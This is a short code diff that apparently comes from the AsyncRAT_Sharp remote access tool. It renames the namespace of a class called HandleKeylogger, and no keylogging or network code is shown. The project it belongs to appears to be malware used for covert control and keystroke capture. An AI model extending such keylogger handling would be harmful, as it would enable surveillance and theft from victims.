@@ -7,7 +7,7 @@ using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
 
-namespace AsyncRAT_Sharp.Forms
+namespace AsyncRAT_Sharp.Handle_Packet
 {
     class HandleKeylogger
     {
